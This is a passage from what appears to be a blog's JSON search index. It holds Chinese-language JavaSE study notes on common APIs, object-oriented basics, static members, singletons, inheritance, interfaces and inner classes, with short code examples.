interface)应用程序编程接口 简单来说就是 Java 已经写好的一些方法，我们只需要拿过来调用即可 Object 认识一下嘛 Object 类的方法是一切子类对象都可以直接索引使用的 常用方法 方法名 说明 public String toString() 默认是返回当前对象在堆内存中的地址信息：类的全限名@内存地址 public boolean equals(Object o) 默认是比较当前对象与另一个对象的地址是否相同，相同返回true，不同返回false toString 父类toString()方法存在的意义就是为了被子类重写，以便返回对象的内容信息，而不是地址信息 子类重写之后，直接输出对象就可以看到对象的数据内容，更有意义 equals ==可以比较两个对象的地址是否相同，但是不能去比较对象的属性 父类equals方法存在的意义就是为了被子类重写，以便子类自己来定制比较规则 Objects 认识一下嘛 Objects 类是一个工具类，提供了一些方法去完成一些功能 常见方法 方法名 说明 public static boolean equals(Object a, Object b) 比较两个对象的，底层会先进行非空判断，从而可以避免空指针异常。再进行equals比较 public static boolean isNull(Object obj) 判断变量是否为null ,为null返回true ,反之 StringBuilder 认识一下 StringBuilder是一个可变的字符串类，可以把它看成是一个对象容器 提高字符串操作效率，比如拼接、修改 构造器 名称 说明 public StringBuilder() 创建一个空白的可变的字符串对象，不包含任何内容 public StringBuilder(String str) 创建一个指定字符串内容的可变字符串对象 常见方法 方法名称 说明 public StringBuilder append(任意类型) 添加数据并返回StringBuilder对象本身 public StringBuilder reverse() 将对象的内容反转 public int length() 返回对象内容长度 public String toString() 通过toString()就可以实现把StringBuilder转换为String Math 认识一下嘛 包含执行基本数字运算的方法，没有公开的构造器 成员都是静态的，直接通过类名来索引 常用方法 方法名 说明 public static int abs(int a) 获取参数绝对值 public static double ceil(double a) 向上取整 public static double floor(double a) 向下取整 public static int round(float a) 四舍五入 public static int max(int a,int b) 获取两个int值中的较大值 public static double pow(double a,double b) 返回a的b次幂的值 public static double random() 返回值为double的随机值，范围[0.0,1.0) System 认识一下嘛 System 也是一个工具类，代表了当前系统，提供一些与系统相关的方法 常用方法 方法名 说明 public static void exit(int status) 终止当前运行的 Java 虚拟机，非零表示异常终止 public static long currentTimeMillis() 返回当前系统的时间毫秒值形式 public static void arraycopy(数据源数组, 起始索引, 目的地数组, 起始索引, 拷贝个数) 数组拷贝 BigDecimal 认识一下嘛 浮点型运算的时候直接+-*/可能会出现数据失真，用于解决浮点型运算精度失真的问题 调用方法封装浮点型数据 BigDecimal b1 = BigDecimal.valueOf(0.1); 常用方法 方法名 说明 public BigDecimal add(BigDecimal b) 加法 public BigDecimal subtract(BigDecimal b) 减法 public BigDecimal multiply(BigDecimal b) 乘法 public BigDecimal divide(BigDecimal b) 除法 public BigDecimal divide (另一个BigDecimal对象，精确几位，舍入模式) 除法 对舍入模式的说明 BigDecimal.ROUND_UP 进一法 BigDecimal.ROUND_FLOOR 去尾法 BigDecimal.ROUND_HALF_UP 四舍五入 LocalDate、LocalTime、LocalDateTime 认识一下嘛 他们 分别表示日期，时间，日期时间对象，他们的类的实例是不可变的对象 三者构建对象和 API 都是通用的 构造器 方法名 说明 public static Xxxx now(); 静态方法，根据当前时间创建对象 public static Xxxx of(...); 静态方法，指定日期/时间创建对象 常见方法 方法名 说明 public int geYear() 获取年 public int getMonthValue() 获取月份（1-12） Public int getDayOfMonth() 获取月中第几天乘法 Public int getDayOfYear() 获取年中第几天 Public DayOfWeek getDayOfWeek() 获取星期 包装类 认识一下嘛 Java 为了实现一切皆对象，为8种基本类型提供了对应的引用类型 集合和泛型也只能支持包装类型，不支持基本数据类型 对应关系 基本数据类型 引用数据类型 byte Byte short Short int Integer long Long char Character float Float double Double boolean Boolean 特性 自动装箱：基本数据类型可以直接赋值给包装类型 自动拆箱：包装类型可以直接赋值给基本数据类型 特有功能 包装类变量默认值为null 可以把基本类型数据转化为字符串类型 Integer.toString(int类型的值); 可以把字符串类型转化为真实的数据类型 Integer.parseInt(\"字符串类型的整数\"); Double.parseDouble(\"字符串类型的小数\"); 正则表达式 认识一下嘛 正则表达式可以用一些规定的字符来制定规则，并用来校验数据格式的合法性 使用详解 字符串对象提供了匹配正则表达的方法 public boolean matches(String regex) 字符类（默认只匹配一个字符） [abc] 只能是a, b, 或c [^abc] 除了a, b, c之外的任何字符 [a-zA-Z] a到z A到Z，包括（范围） [a-d[m-p]] a到d，或m通过p：（[a-dm-p]联合） [a-z\u0026\u0026[def]] d, e, 或f(交集) [a-z\u0026\u0026[^bc]] a到z，除了b和c：（[ad-z]减法） 预定义字符类（默认只匹配一个字符） . 任何字符 \\d 一个数字： [0-9] \\D 非数字： [^0-9] \\s 一个空白字符： [ \\t\\n\\x0B\\f\\r] \\S 非空白字符： [^\\s] \\w [a-zA-Z_0-9] 英文、数字、下划线 \\W [^\\w] 一个非单词字符 贪婪量词 X? X，一次或根本不 X* X，零次或多次 X+ X，一次或多次 X {n} X，正好n次 X {n, } X，至少n次 X {n,m} X，至少n但不超过m次 用例 System.out.println(\"a\".matches(\"[abc]\")); // true System.out.println(\"z\".matches(\"[abc]\")); // false System.out.println(\"ab\".matches(\"[abc]\")); // false System.out.println(\"ab\".matches(\"[abc]+\")); //true 在字符串方法中的应用 方法名 说明 public String replaceAll(String regex,String newStr) 按照正则表达式匹配的内容进行替换 public String[] split(String regex) 按照正则表达式匹配的内容进行分割字符串，反回一个字符串数组。 方法名 Arrays 认识一下嘛 用于操作数组的工具类 常见方法 方法名 说明 public static String toString(类型[] a) 返回数组的内容（字符串形式） public static void sort(类型[] a) 对数组进行默认升序排序 public static \u003cT\u003e void sort(类型[] a, Comparator\u003c? super T\u003e c) 使用比较器对象自定义排序 public static","date":"2021-12-08","objectID":"/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89java%E4%B9%8B%E5%B8%B8%E8%A7%81api/:0:0","tags":null,"title":"愿天堂没有Java之常见API","uri":"/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89java%E4%B9%8B%E5%B8%B8%E8%A7%81api/"},{"categories":["Java"],"content":"JavaSE 笔记（二） Java 是一门非常严谨的语言 final 认识一下嘛 可以修饰 方法：表明该方法是最终方法，不能被重写 变量：表示该变量第一次赋值后，不能再次被赋值(有且仅能被赋值一次) 类：表明该类是最终类，不能被继承 注意事项 修饰基本类型：变量存储的数据值不能发生改变 修饰引用类型：存储的地址值不能改变，但是地址指向的对象内容可以改变 常量 认识一下嘛 常量是使用了public static final修饰的成员变量，必须有初始化值，而且执行的过程中其值不能被改变 可以用于做系统的配置信息，方便程序的维护，同时也能提高可读性 执行原理 在编译阶段会进行宏替换，把使用常量的地方全部替换成真实的字面量 这样做的好处是让使用常量的程序的执行性能与直接使用字面量是一样的 枚举 认识一下嘛 是 Java 中的一种特殊类型 是为了做信息的标志和信息的分类 格式 修饰符 enum 枚举名称{ 第一行都是罗列枚举类实例的名称 } enum Season{ SPRING , SUMMER , AUTUMN , WINTER; } 特征 枚举类都是继承了枚举类型：java.lang.Enum 枚举都是最终类，不可以被继承 构造器都是私有的，枚举对外不能创建对象 抽象类 认识一下嘛 如果一个类中的某个方法的具体实现不能确定，就可以申明成 abstract 修饰的抽象方法（不能写方法体了），这个类必须用 abstract 修饰，被称为抽象类 格式 修饰符 abstract class 类名{ 修饰符 abstract 返回值类型 方法名称(形参列表); } public abstract class Animal{ public abstract void run(); } 注意事项 得到了抽象方法，失去了创建对象的能力（这波是有得有失） 抽象类可以理解成类的不完整设计图，是用来被子类继承的 一个类如果继承了抽象类，那么这个类必须重写完抽象类的全部抽象方法，否则这个类也必须定义成抽象类 不能用 abstract 修饰变量、代码块、构造器 接口 认识一下嘛 接口是一种规范 接口不能实例化 接口中的成员都是 public 修饰，不论你写不写，因为规范的目的是为了公开化 格式 public interface 接口名{ // 常量 // 抽象方法 } 使用方法 接口是用来被类实现的，实现接口的类叫做实现类，实现类可以理解为“子类” 接口可以被类单独实现，也可以被多实现 修饰符 class 实现类 implements 接口1, 接口2, 接口3 , ... { } 接口与接口的关系 多继承，一个接口可以同时继承多个接口 规范合并，整合多个接口为同一个接口，便于子类实现 内部类概述 认识一下嘛 内部类就是定义在一个类里面的类，里面的类可以理解为寄生，外面的类可以理解为宿主 public class People{ // 内部类 public class Heart{ } } 使用场景 当一个事物的内部还有一个部分需要一个完整的结构进行概述，而这个内部的完整的结构又只为外部事物提供服务，那么这个内部事物就可以选择用内部类来设计 内部类通常可以方便的访问外部成员，包括私有的成员 作用 提供了更好的封装性，可以在封装性这个层面做到更多控制 内部类之一：静态内部类（了解） 认识一下嘛 有 static 修饰，属于外部类本身 和普通类使用完全一致 格式 public class Outer{ // 静态成员内部类 public static class Inner{ } } 外部类名.内部类名 对象名称 = new 外部类名.内部类构造器; Outer.Inner in = new Outer.Inner(); 总结 譬如汽车类中的发动机类 可以直接访问外部类的静态成员，不能直接访问外部类的实例成员 内部类之二：成员内部类（了解） 认识一下嘛 无static修饰，属于外部类的对象 JDK16之前，成员内部类中不能定义静态成员，JDK 16开始也可以定义静态成员了 格式 public class Outer{ // 成员内部类 public class Inner{ } } 外部类名.内部类名 对象名称 = new 外部类构造器.new 内部类构造器; Outer.Inner in = new Outer().new Inner(); 总结 譬如人类中的心脏类 可以直接访问外部类的静态成员，可以通过实例方法直接访问外部类的实例成员 内部类之三：局部内部类（了解） 认识一下嘛 局部内部类放在方法、代码块、构造器等执行体中 局部内部类的类文件名为：外部类$内部类.class 内部类之四：匿名内部类 认识一下嘛 本质上是一个没有名字的局部内部类，定义在方法、代码块等 方便创建子类对象，其实质就是为了简化代码 格式 new 类||抽象类名||接口名(){ 重写方法; } Animal a = new Animal() { public void run() { } }; a. run(); 总结 匿名内部类是没有名称的 会创建一个匿名内部类的对象 匿名内部类的对象就是当前new的那个类型的子类 实例 案例一 /*游泳接口*/ public interface Swimming { void swim(); } /* 测试类*/ public class JumppingDemo { public static void main(String[] args) { //需求：goSwimming方法 JumppingDemo.goSwimming(new Swimming(){ @Override public void swim(){ System.out.println(\"Poria不会游泳~~~\"); } }); // 以上代码还可简化为 JumppingDemo.goSwimming(() -\u003e System.out.println(\"Poria不会游泳~~~\")); } // 定义一个方法让所有角色进来一起比赛 public static void goSwimming(Swimming swimming) { swimming.swim(); } } 案例二 // 为按钮绑定点击事件监听器 btn.addActionListener(new ActionListener() { @Override public void actionPerformed(ActionEvent e) { System.out.println(\"登录一下~~\"); } }); // 以上代码还可简化为 btn.addActionListener(e -\u003e System.out.println(\"登录一下~~\")); ","date":"2021-12-08","objectID":"/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89java%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E8%BF%9B%E9%98%B6/:0:0","tags":null,"title":"愿天堂没有Java之面向对象进阶","uri":"/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89java%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E8%BF%9B%E9%98%B6/"},{"categories":["Java"],"content":"JavaSE 笔记（一） Java 是一门非常严谨的语言 面向对象概述 认识一下嘛 面向对象编程就是就是拿或找东西过来编程 public class Test { public static void main(String[] args) { // 1、创建一个扫描器对象，用于接收用户输入的数据 System.out.println(\"请您输入您的年龄：\"); int age = sc.nextInt(); System.out.println(age); // 2、得到一个随机数对象，用于得到随机数 int data = r.nextInt(10) + 1 ; // 生成 1-10之间的随机数 System.out.println(data); } } 定义类的注意事项 类名首字母大写，满足驼峰模式 一个 Java 文件可以定义多个类，但只有一个类可以被 public 修饰，且该类必须成为文件名称 一般建议一个 Java 文件只定义一个类 类的成分 public class Student{ // 1、成员变量 private String name; // 2、构造器 public Student(){} // 3、方法 public void run(){} // 4、代码块 static{} // 5、内部类 public class Heart{} } 构造器 认识一下嘛 初始化类的对象并返回对象的地址 格式 构造器格式 修饰符 类名（形参列表）{ } 初始化对象格式 类名 对象变量 = new 构造器; 分类和作用 public class Student { // 成员变量 private String name; private int age; // 1、无参数构造器 public Student(){ } // 2、有参数构造器 public Student(String name, int age) { this.name = name; this.age = age; } // getter + setter方法 } 注意事项 任何类定义出来，默认自带无参构造器，写不写都存在 一旦定义有参构造器，无参构造器就消失了，此时就需要自定义无参构造器 this 关键字 认识一下嘛 作用：出现在成员方法中、构造器中，代表当前对象的地址，用于指定访问当前对象的成员变量、成员方法 this 出现在构造器或者方法中，哪个对象调用它，this 就代表哪个对象 面向对象三特征之一：封装 认识一下嘛 基本思想：解决属性和方法属于哪个对象的问题 步骤：通常是将成员变量私有，然后提供方法去合理暴露 作用：提高业务功能设计的安全性，提高程序逻辑性和开发效率 标准 JavaBean 可以理解为实体类，其对象可以用于封装数据，符合封装的思想 格式 成员变量用 private 修饰 提供每一个成员变量对应的 set 和 get 方法 必须提供一个无参构造器 static 关键字 认识一下嘛 static 是静态的意思，可以修饰成员变量和成员方法 static 修饰表示只在内存中存储一份，可以被共享访问、修改 修饰成员变量 实例成员变量，无 static 修饰，属于对象，访问格式： public class User { // 实例成员变量 private int age; } 对象.实例成员变量 静态成员变量，被 static 修饰，共享，访问格式（一般用第一种方式）： public class User { // 静态成员变量 public static String onlineNumber= 161; } 类名.静态成员变量 对象.静态成员变量 修饰成员方法 实例成员方法，无 static 修饰，属于对象，只能用对象触发访问 public void run(){ System.out.println(name + \"poria\"); } 对象.实例成员方法 静态成员方法，被 static 修饰，属于类，建议用类名访问，也可以用对象访问 public static int getMax(int a , int b){ return a \u003e b ? a : b; } 类名.静态成员方法 对象.静态成员方法 注意事项 静态方法只能访问静态的成员，不可以直接访问实例成员 实例方法可以访问静态的成员，也可以访问实例成员 静态方法中不会出现 this 关键字 static 应用实例——工具类 工具类中定义的都是静态方法，调用方便，提高了代码复用（一次编写，处处可用） 注意事项： 工具类的构造器一般都为私有，无需创建对象 由于工具类中都是静态方法，直接用类名索引访问即可 static 应用知识——代码块 类的五大成分之一，定义在类中 分类 静态代码块 格式：static{} 特点：需要通过 static 关键字修饰，随着类的加载而加载，并且自动触发、只执行一次 构造代码块（很少用到） 格式：{} 特点：每次创建对象，调用构造器执行时，都会执行该代码块中的代码，并且在构造器执行前执行 static 应用知识——单例设计模式 单例模式： 可以保证系统中，应用该模式的这个类永远只有一个实例，即这个类永远只能创建一个对象 例如任务管理器对象我们只需要一个就可以解决问题了，这样可以节省内存空间 饿汉单例 在用类获取对象的时候，对象已经提前创建好 /** 定义一个单例类 */ public class SingleInstance { /** 定义一个静态变量存储一个对象即可 :属于类，与类一起加载一次 */ public static SingleInstance instance = new SingleInstance (); /** 单例必须私有构造器*/ private SingleInstance (){ System.out.println(\"创建了对象\"); } } 设计步骤： 定义一个类，把构造器私有 定义一个静态变量储存一个对象 懒汉单例 在真正需要对象的时候，才去创建一个对象（延迟加载） /** 定义一个单例类 */ class SingleInstance{ /** 定义一个静态变量存储一个对象即可 :属于类，与类一起加载一次 */ public static SingleInstance instance ; // null /** 单例必须私有构造器*/ private SingleInstance(){} /** 必须提供一个方法返回一个单例对象 */ public static SingleInstance getInstance(){ ... return ...; } } 设计步骤 定义一个类，把构造器私有 定义一个静态变量存储一个对象 提供一个返回单例对象的方法 面向对象三特征之二：继承 认识一下嘛 Java中提供一个关键字extends，用这个关键字，可以让一个类和另一个类建立起父子关系 public class Student extends People {} Student 成为子类（派生类），People 称为父类（基类、超类） 提高了代码复用，减少代码冗余，增强类的功能拓展性 设计规范 子类们的相同特征（共性属性、共性方法）放在父类中定义 子类独有的属性和行为应该定义在自己的类中 特点 子类可以继承父类的属性（变量）和行为（方法），但是不能继承父类构造器 Java 是单继承模式，一个类只能继承一个父类（不然就乱伦了 Java 支持多层继承 Java 中所有类都是 Object 的子类，Object 是祖宗类 子类是否可以继承父类的私有成员？ 我认为，可以继承，只是不能访问到 子类是否可以继承父类的静态成员和方法？ 我认为，不能继承，虽然子类可以使用父类的静态成员和方法，但是这是 static 的共享特性，共享并非是继承 索引访问特点 在子类方法中访问成员和方法满足就近原则，子类中找不到找父类，父类中找不到就报错（可以类比于 JavaScript 中的原型链） 如果在子父类中出现了重名的成员或方法，而此时一定要在子类中调用父类的成员或方法时，需要用到 super 关键字，指定访问父类的成员或方法 super.父类成员变量 super.父类成员方法 方法重写 子类写一个与父类一样的方法覆盖父类的方法 @Override注解是放在重写后的方法上，作为重写是否正确的校验注解 注意事项和要求 重写方法的名称、形参列表必须和被重写的方法一致（重写不是改写，戏说不是胡说） 私有方法不能被重写，静态方法不能被重写 子类重写父类方法时，访问权限必须大于或者等于父类 子类构造器 子类中所有的构造器会默认先访问父类中无参构造器，然后再执行自己的 子类初始化之前，一定要调用父类构造器先完成父类数据空间的初始化 子类构造器的第一行语句默认都是：super()，不写也存在 如果父类中没有无参构造器，那么此时就会报错，子类就需要手动书写super()来调用父类的有参构造器 包 认识一下嘛 包是用来分门别类的管理各种不同类的，类似于文件夹、建包利于程序的管理和维护 建包 建包语句必须在第一行，包名建议全部英文小写 格式 package 公司域名倒写.技术名称 package com.poria.tools 导包 相同包下的类可以直接访问，不同包下的类必须导包,才可以使用 假如一个类中需要用到不同类，而这个两个类的名称是一样的，那么默认只能导入一个类，另一个类要带包名访问 格式 import 包名.类名 import com.poria.tools.Test ","date":"2021-12-07","objectID":"/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89java%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/:0:0","tags":null,"title":"愿天堂没有Java之面向对象","uri":"/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89java%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"}]